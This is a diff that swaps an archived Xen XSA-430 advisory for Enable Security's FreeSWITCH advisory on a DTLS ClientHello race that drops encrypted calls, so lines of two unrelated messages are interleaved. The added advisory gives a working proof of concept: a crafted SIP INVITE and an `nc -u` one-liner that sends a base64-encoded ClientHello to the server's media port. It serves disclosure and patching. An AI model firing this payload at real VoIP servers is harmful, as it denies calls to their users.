@@ -1,105 +1,124 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/04/25/1
-Message-Id: <E1prHNo-0005by-4j@xenbits.xenproject.org>
-Date: Tue, 25 Apr 2023 12:02:56 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security-team-members@....org>
-Subject: Xen Security Advisory 430 v2 (CVE-2022-42335) - x86 shadow paging arbitrary pointer dereference
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/12/23/4
+Message-Id: <6c03ed50-7ba0-4b0c-9c65-7c05ba10fea4@app.fastmail.com>
+Date: Sat, 23 Dec 2023 19:38:15 +0100
+From: "Sandro Gauci" <sandro@...blesecurity.com>
+To: oss-security@...ts.openwall.com, fulldisclosure@...lists.org, fulldisclosure@...lists.org, voipsec@...psa.org, submissions@...ketstormsecurity.org, vuln@...unia.com, cert@...t.org
+Subject: [ES2023-02] FreeSWITCH susceptible to Denial of Service via DTLS Hello packets during call initiation
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+# FreeSWITCH susceptible to Denial of Service via DTLS Hello packets during call initiation
 
-            Xen Security Advisory CVE-2022-42335 / XSA-430
-                               version 2
+- Fixed versions: 1.10.11
+- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2023-02-freeswitch-dtls-hello-race
+- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-39gv-hq72-j6m6
+- Other references: CVE-2023-51443
+- Tested vulnerable versions: 1.10.10
+- Timeline:
+	- Report date: 2023-09-27
+	- Triaged: 2023-09-27
+	- Fix provided for testing: 2023-09-29
+	- Vendor release with fix: 2023-12-22
+	- Enable Security advisory: 2023-12-22
 
-             x86 shadow paging arbitrary pointer dereference
+## TL;DR
 
-UPDATES IN VERSION 2
-====================
+When handling DTLS-SRTP for media setup, FreeSWITCH is susceptible to Denial of Service due to a race condition in the hello handshake phase of the DTLS protocol. This attack can be done continuously, thus denying new DTLS-SRTP encrypted calls during the attack.
 
-Public release.
+## Description
 
-ISSUE DESCRIPTION
-=================
+Our research has shown that key establishment for Secure Real-time Transport Protocol (SRTP) using Datagram Transport Layer Security Extension (DTLS)[^1] is susceptible to a Denial of Service attack due to a race condition. If an attacker manages to send a ClientHello DTLS message with an invalid CipherSuite (such as `TLS_NULL_WITH_NULL_NULL`) to the port on the FreeSWITCH server that is expecting packets from the caller, a DTLS error is generated. This results in the media session being torn down, which is followed by teardown at signaling (SIP) level too.
 
-In environments where host assisted address translation is necessary
-but Hardware Assisted Paging (HAP) is unavailable, Xen will run guests
-in so called shadow mode.  Due to too lax a check in one of the hypervisor
-routines used for shadow page handling it is possible for a guest with a PCI
-device passed through to cause the hypervisor to access an arbitrary pointer
-partially under guest control.
+This behavior was tested against FreeSWITCH version 1.10.10, which was found to be vulnerable to this issue.
 
-IMPACT
-======
+The following sequence diagram shows the normal flow (i.e. no attack) involving SIP and DTLS messages between a UAC (the Caller) and an FreeSWITCH server capable of handling WebRTC calls.
 
-Guests running in shadow mode and having a PCI device passed through may be
-able to cause Denial of Service and other problems, escalation of privilege
-cannot be ruled out.
+Diagram showing a call setup against FreeSWITCH that uses SIP and DTLS:
+https://user-images.githubusercontent.com/4557407/271063734-85425e09-6945-49b1-ba73-751b6d592ea4.png
 
-VULNERABLE SYSTEMS
-==================
+In a controlled experiment, it was observed that when the Attacker sent a DTLS ClientHello to FreeSWITCH's media port from a different IP and port, FreeSWITCH responded by sending a DTLS Alert to the Caller. Additionally, FreeSWITCH terminated the SIP call by sending a BYE message to the Caller.
 
-Only Xen version 4.17 is vulnerable.
+Diagram showing a call setup against FreeSWITCH that fails due to an attacker controlled DTLS ClientHello:
+https://user-images.githubusercontent.com/4557407/271064011-032f9a0e-15af-4645-b008-1fe8b706d75e.png
 
-Only x86 systems are vulnerable.  The vulnerability can be leveraged only
-by HVM guests running with shadow paging and having a PCI device passed
-through.
+During a real attack, the attacker would spray a vulnerable FreeSWITCH server with DTLS ClientHello messages. The attacker would typically target the range of UDP ports allocated for RTP. When the ClientHello message from the Attacker wins the race against an expected ClientHello from the Caller, the call terminates, resulting in Denial of Service.
 
-MITIGATION
-==========
 
-Not passing through PCI devices to HVM guests will avoid the vulnerability.
+## Impact
 
-Running HVM guests only in HAP (Hardware Assisted Paging) mode will also
-avoid the vulnerability.
+Abuse of this vulnerability may lead to a massive Denial of Service on vulnerable FreeSWITCH servers for calls that rely on DTLS-SRTP.
 
-CREDITS
-=======
+## How to reproduce the issue
 
-This issue was discovered by Roger Pau Monné of XenServer.
+1. Prepare a FreeSWITCH server with an extension configured to handle WebRTC
+1. Send an INVITE message to the target server with WebRTC SDP:
 
-RESOLUTION
-==========
+    ```default
+	INVITE sip:1000@....168.1.202 SIP/2.0
+	Via: SIP/2.0/WSS 192.168.1.202:36742;rport=36742;branch=z9hG4bK-jQcnXJadB2VGfGmQ
+	Max-Forwards: 70
+	From: <sip:1000@....168.1.202>;tag=L9kc5NfpYG1u67cT
+	To: <sip:1000@....168.1.202>
+	Contact: <sip:1000@....168.1.202>
+	Call-ID: DzGnBLt0z9SK3MC0
+	CSeq: 5 INVITE
+	Content-Type: application/sdp
+	Content-Length: 385
 
-Applying the attached patch resolves this issue.
+	v=0
+	o=- 1695296331 1695296331 IN IP4 192.168.1.202
+	s=-
+	t=0 0
+	c=IN IP4 192.168.1.202
+	m=audio 45825 UDP/TLS/RTP/SAVPF 0 8 101
+	a=setup:active
+	a=fingerprint:sha-256 49:05:98:B2:15:43:1C:9C:4F:29:07:60:F8:63:77:16:80:F9:44:C0:97:8E:E5:48:D6:71:B4:03:10:85:D6:E3
+	a=rtpmap:0 PCMU/8000/1
+	a=rtpmap:8 PCMA/8000/1
+	a=rtpmap:101 telephone-event/8000
+	a=rtcp-mux
+	a=rtcprsize
+	a=sendrecv
+	```
+1. Note FreeSWITCH's media port and IP values, which will be used as the `<freeswitch-ip>` and `<media-port>` parameters by the Attacker
+1. Send a DTLS ClientHello message from a (attacker-controlled) host, which is different from the Caller but has network access to the FreeSWITCH server
 
-Note that patches for released versions are generally prepared to
-apply to the stable branches, and may not apply cleanly to the most
-recent release tarball.  Downstreams are encouraged to update to the
-tip of the stable branch before applying these patches.
+    ```bash
+	CLIENT_HELLO="Fv7/AAAAAAAAAAAAfAEAAHAAAAAAAAAAcP79AAA" 
+	CLIENT_HELLO="${CLIENT_HELLO}AAG4HCVaUNVbYVmxuqdn2WyCgtTijhZ+WheP/+H"
+	CLIENT_HELLO="${CLIENT_HELLO}4AAAACAAABAABEABcAAP8BAAEAAAoACAAGAB0AF"
+	CLIENT_HELLO="${CLIENT_HELLO}wAYAAsAAgEAACMAAAANABQAEgQDCAQEAQUDCAUF"
+	CLIENT_HELLO="${CLIENT_HELLO}AQgGBgECAQAOAAkABgABAAgABwA="
+	echo -n "${CLIENT_HELLO}" | base64 --decode | nc -u <freeswitch-ip> <media-port>
+	```
+1. Observe that the Caller received a DTLS Alert message and a SIP BYE message on its signaling channel
 
-xsa430.patch           xen-unstable - Xen 4.17.x
+Note that the above steps are used to reliably reproduce the vulnerability. In case of a real attack, the attacker simply has to spray the FreeSWITCH server with DTLS messages.
 
-$ sha256sum xsa430*
-c861cabdf546ec7583f2193f9c4f8a62579047315e5fe9eca3e9e944b67ca852  xsa430.patch
-$
+## Solution and recommendations
 
-DEPLOYMENT DURING EMBARGO
-=========================
+To address this vulnerability, upgrade FreeSWITCH to the latest version which includes the security fix. The solution implemented is to drop all packets from addresses that have not been validated by an ICE check.
 
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
+## About Enable Security
 
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
+[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.
 
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
------BEGIN PGP SIGNATURE-----
+## Disclaimer
 
-iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAmRHr/4MHHBncEB4ZW4u
-b3JnAAoJEIP+FMlX6CvZ6UsH/ib0ei76XtojIl9eaNCPoAotcGBXLDQScV133z5e
-7UhW3JPUEG79+p22ACL52Km7wVtWwuL5QzbBDJaw47hTD1IwvoOTQ8Dx+KwyZGsK
-H8VW8WM70XyqxRJVfA+sEIEfRnxXKfWz6qWV5n2085XzFFwbF9c+ZZ6NafGv/Jd3
-75eUwyGaR0o4YEnzKpLzqYFihK56YyJmZ0+rdYYydHKUy+oVcWjrNEh41Xa6lCJX
-OdZ60inTu8rizItE+xEsKLatvoKVrO9q/zhAtLm+iWldf8PTgY9tq4S89DRMD/BN
-uYIAL1xBCS2HC/IyUXI63PMwHg6fYzq+0JLjtYV0IYDfYE8=
-=tInZ
------END PGP SIGNATURE-----
+The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
 
-Download attachment "xsa430.patch" of type "application/octet-stream" (2638 bytes)
+## Disclosure policy
+
+This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.
+
+[^1]: Datagram Transport Layer Security (DTLS) Extension to Establish Keys for the Secure Real-time Transport Protocol (SRTP) https://datatracker.ietf.org/doc/html/rfc5764
+
+--
+ 
+    Sandro Gauci, CEO at Enable Security GmbH
+
+    Register of Companies:       AG Charlottenburg HRB 173016 B
+    Company HQ:                       Neuburger Straße 101 b, 94036 Passau, Germany
+    RTCSec Newsletter:               https://www.rtcsec.com/subscribe
+    Our blog:                                https://www.rtcsec.com
+    Other points of contact:       https://www.enablesecurity.com/contact/
